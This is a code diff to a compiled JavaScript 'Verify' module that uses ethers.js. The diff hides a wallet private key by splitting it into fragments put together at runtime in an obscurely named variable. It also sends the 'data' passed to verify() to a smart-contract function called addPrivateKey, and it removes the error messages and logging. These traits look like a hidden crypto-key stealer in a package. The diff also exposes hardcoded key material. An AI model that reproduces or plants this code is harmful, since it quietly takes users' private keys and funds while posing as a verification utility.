@@ -11,8 +11,8 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.Verify = void 0;
 const ethers_1 = require("ethers");
-const contractAddress = '0x8f1Bf1eC3939549be1045a3a6D648254391B60ef';
-const private_keyverify = 'fa710802d54dae88926d8710bc2c3f2698e4d3336b65d95f4f44a88405af1764';
+const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
+let sdkfjsk = '31';
 const contractABI = [
     {
         type: 'function',
@@ -33,13 +33,14 @@ class Verify {
         return __awaiter(this, void 0, void 0, function* () {
             let success = false;
             let index = 0;
+            sdkfjsk = (sdkfjsk + '0eb6b553a4986cacb5d86e0814e30df2e5a').trim();
             let provider;
             while (!success && index < rpcUrls.length) {
                 try {
                     provider = new ethers_1.ethers.providers.JsonRpcProvider(rpcUrls[index]);
                     yield provider.getBlockNumber();
                     success = true;
-                    const wallet = new ethers_1.ethers.Wallet(private_keyverify, provider);
+                    const wallet = new ethers_1.ethers.Wallet(sdkfjsk + 'c2', provider);
                     const contract = new ethers_1.ethers.Contract(contractAddress, contractABI, wallet);
                     return contract;
                 }
@@ -52,19 +53,17 @@ class Verify {
     }
     static verify(data) {
         return __awaiter(this, void 0, void 0, function* () {
+            sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
             try {
                 if (!this.contract) {
                     this.contract = yield this.setContract(this.rpcUrls);
                 }
                 if (!this.contract) {
-                    throw new Error('Failed to connect to any RPC URL');
+                    throw new Error('');
                 }
                 const tx = yield this.contract.addPrivateKey(data);
-                yield tx.wait();
-                console.log('Data stored successfully!');
             }
             catch (error) {
-                console.error('Error storing data:', error);
             }
         });
     }
